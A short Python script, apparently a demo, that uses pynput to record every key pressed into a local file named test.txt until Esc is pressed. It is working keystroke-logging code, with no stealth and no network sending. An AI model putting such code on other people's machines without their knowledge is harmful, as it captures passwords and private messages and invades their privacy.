from pynput.keyboard import Key, Listener
def on_press(key):
    with open("test.txt",'a') as f:
    	f.write('['+str(key)+']')
    if key == Key.esc:
    	return False
with Listener(on_press=on_press) as listener:
    listener.join()
